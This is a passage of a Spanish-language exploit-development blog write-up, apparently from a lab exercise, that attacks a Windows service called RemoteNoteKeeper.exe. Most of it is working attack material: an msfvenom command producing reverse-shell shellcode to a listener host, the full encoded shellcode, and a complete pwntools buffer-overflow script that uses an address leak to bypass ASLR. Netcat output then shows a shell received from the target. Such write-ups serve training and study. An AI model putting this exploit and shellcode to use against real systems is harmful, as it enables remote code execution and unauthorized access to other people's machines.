+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file RemoteNoteKeeper.exe --search </span><span class="am">"ret;"</span><span class="p"> -I 0x0  
+</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
+</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
+</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: RemoteNoteKeeper.exe
+</span><span class="ro">0x00001009</span><span class="p">:</span><span class="am"> ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que tenemos la estratégia solo nos queda crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code>, en este caso crearemos uno que nos envie una revshell en caso de que se ejecute</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/jmp_call_additive
+x86/jmp_call_additive succeeded with size 353 (iteration=0)
+x86/jmp_call_additive chosen with final size 353
+Payload size: 353 bytes
+Final size of python file: 1990 bytes
+shellcode =  b""
+shellcode += b"\xfc\xbb\xcb\x6e\xb3\xbf\xeb\x0c\x5e\x56\x31"
+shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
+shellcode += b"\xff\xff\xff\x37\x86\x31\xbf\xc7\x57\x56\x49"
+shellcode += b"\x22\x66\x56\x2d\x27\xd9\x66\x25\x65\xd6\x0d"
+shellcode += b"\x6b\x9d\x6d\x63\xa4\x92\xc6\xce\x92\x9d\xd7"
+shellcode += b"\x63\xe6\xbc\x5b\x7e\x3b\x1e\x65\xb1\x4e\x5f"
+shellcode += b"\xa2\xac\xa3\x0d\x7b\xba\x16\xa1\x08\xf6\xaa"
+shellcode += b"\x4a\x42\x16\xab\xaf\x13\x19\x9a\x7e\x2f\x40"
+shellcode += b"\x3c\x81\xfc\xf8\x75\x99\xe1\xc5\xcc\x12\xd1"
+shellcode += b"\xb2\xce\xf2\x2b\x3a\x7c\x3b\x84\xc9\x7c\x7c"
+shellcode += b"\x23\x32\x0b\x74\x57\xcf\x0c\x43\x25\x0b\x98"
+shellcode += b"\x57\x8d\xd8\x3a\xb3\x2f\x0c\xdc\x30\x23\xf9"
+shellcode += b"\xaa\x1e\x20\xfc\x7f\x15\x5c\x75\x7e\xf9\xd4"
+shellcode += b"\xcd\xa5\xdd\xbd\x96\xc4\x44\x18\x78\xf8\x96"
+shellcode += b"\xc3\x25\x5c\xdd\xee\x32\xed\xbc\x66\xf6\xdc"
+shellcode += b"\x3e\x77\x90\x57\x4d\x45\x3f\xcc\xd9\xe5\xc8"
+shellcode += b"\xca\x1e\x09\xe3\xab\xb0\xf4\x0c\xcc\x99\x32"
+shellcode += b"\x58\x9c\xb1\x93\xe1\x77\x41\x1b\x34\xd7\x11"
+shellcode += b"\xb3\xe7\x98\xc1\x73\x58\x71\x0b\x7c\x87\x61"
+shellcode += b"\x34\x56\xa0\x08\xcf\x31\x0f\x64\xab\x88\xe7"
+shellcode += b"\x77\x33\x0a\x43\xfe\xd5\x66\xa3\x57\x4e\x1f"
+shellcode += b"\x5a\xf2\x04\xbe\xa3\x28\x61\x80\x28\xdf\x96"
+shellcode += b"\x4f\xd9\xaa\x84\x38\x29\xe1\xf6\xef\x36\xdf"
+shellcode += b"\x9e\x6c\xa4\x84\x5e\xfa\xd5\x12\x09\xab\x28"
+shellcode += b"\x6b\xdf\x41\x12\xc5\xfd\x9b\xc2\x2e\x45\x40"
+shellcode += b"\x37\xb0\x44\x05\x03\x96\x56\xd3\x8c\x92\x02"
+shellcode += b"\x8b\xda\x4c\xfc\x6d\xb5\x3e\x56\x24\x6a\xe9"
+shellcode += b"\x3e\xb1\x40\x2a\x38\xbe\x8c\xdc\xa4\x0f\x79"
+shellcode += b"\x99\xdb\xa0\xed\x2d\xa4\xdc\x8d\xd2\x7f\x65"
+shellcode += b"\xbd\x98\xdd\xcc\x56\x45\xb4\x4c\x3b\x76\x63"
+shellcode += b"\x92\x42\xf5\x81\x6b\xb1\xe5\xe0\x6e\xfd\xa1"
+shellcode += b"\x19\x03\x6e\x44\x1d\xb0\x8f\x4d\x1d\x36\x70"
+shellcode += b"\x6e"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El exploit inicia obteniendo la base del binario a través del leak con la función <code class="language-plaintext highlighter-rouge">DEBUG</code>, esto para evitar el <code class="language-plaintext highlighter-rouge">ASLR</code>, luego creará una nota con <code class="language-plaintext highlighter-rouge">NOTE</code> la cual inicia con el shellcode, luego rellena con <code class="language-plaintext highlighter-rouge">A's</code> hasta el offset del return address y en él ejecutará un <code class="language-plaintext highlighter-rouge">ret</code> que retornará al inicio del buffer donde ejecuta el shellcode de la revshell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"DEBUG exp301isfun"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"READ DEBUG"</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline_contains(</span><span class="no">b</span><span class="s">"RemoteNoteKeeper.exe"</span><span class="p">)[</span><span class="o">-</span><span class="mi">11</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">], </span><span class="mi">16</span><span class="p">)  
+
+shellcode</span><span class="o"> =</span><span class="no">  b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\xcb\x6e\xb3\xbf\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x37\x86\x31\xbf\xc7\x57\x56\x49</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x22\x66\x56\x2d\x27\xd9\x66\x25\x65\xd6\x0d</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6b\x9d\x6d\x63\xa4\x92\xc6\xce\x92\x9d\xd7</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x63\xe6\xbc\x5b\x7e\x3b\x1e\x65\xb1\x4e\x5f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa2\xac\xa3\x0d\x7b\xba\x16\xa1\x08\xf6\xaa</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4a\x42\x16\xab\xaf\x13\x19\x9a\x7e\x2f\x40</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3c\x81\xfc\xf8\x75\x99\xe1\xc5\xcc\x12\xd1</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb2\xce\xf2\x2b\x3a\x7c\x3b\x84\xc9\x7c\x7c</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x23\x32\x0b\x74\x57\xcf\x0c\x43\x25\x0b\x98</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x57\x8d\xd8\x3a\xb3\x2f\x0c\xdc\x30\x23\xf9</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xaa\x1e\x20\xfc\x7f\x15\x5c\x75\x7e\xf9\xd4</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcd\xa5\xdd\xbd\x96\xc4\x44\x18\x78\xf8\x96</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc3\x25\x5c\xdd\xee\x32\xed\xbc\x66\xf6\xdc</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3e\x77\x90\x57\x4d\x45\x3f\xcc\xd9\xe5\xc8</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xca\x1e\x09\xe3\xab\xb0\xf4\x0c\xcc\x99\x32</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x9c\xb1\x93\xe1\x77\x41\x1b\x34\xd7\x11</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb3\xe7\x98\xc1\x73\x58\x71\x0b\x7c\x87\x61</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x34\x56\xa0\x08\xcf\x31\x0f\x64\xab\x88\xe7</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x77\x33\x0a\x43\xfe\xd5\x66\xa3\x57\x4e\x1f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5a\xf2\x04\xbe\xa3\x28\x61\x80\x28\xdf\x96</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4f\xd9\xaa\x84\x38\x29\xe1\xf6\xef\x36\xdf</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9e\x6c\xa4\x84\x5e\xfa\xd5\x12\x09\xab\x28</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6b\xdf\x41\x12\xc5\xfd\x9b\xc2\x2e\x45\x40</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x37\xb0\x44\x05\x03\x96\x56\xd3\x8c\x92\x02</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x8b\xda\x4c\xfc\x6d\xb5\x3e\x56\x24\x6a\xe9</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3e\xb1\x40\x2a\x38\xbe\x8c\xdc\xa4\x0f\x79</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x99\xdb\xa0\xed\x2d\xa4\xdc\x8d\xd2\x7f\x65</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xbd\x98\xdd\xcc\x56\x45\xb4\x4c\x3b\x76\x63</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x92\x42\xf5\x81\x6b\xb1\xe5\xe0\x6e\xfd\xa1</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x19\x03\x6e\x44\x1d\xb0\x8f\x4d\x1d\x36\x70</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6e</span><span class="s">"</span><span class="p">
+
+offset</span><span class="o"> =</span><span class="mi"> 4080</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">-</span><span class="no"> len</span><span class="p">(shellcode))
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"NOTE "</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p32(binary_base </span><span class="o">+ </span><span class="mi">0x1009</span><span class="p">)</span><span class="c1"> # ret;</span><span class="p">
+
+shell.sendafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 1337: Done  
+[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 1337</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.5 51565
+Microsoft Windows [Versión 10.0.22621.4317]
+(c) Microsoft Corporation. Todos los derechos reservados.  
+
+C:\></span><span class="am"> whoami</span><span class="p">
+windows\user
+C:\></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
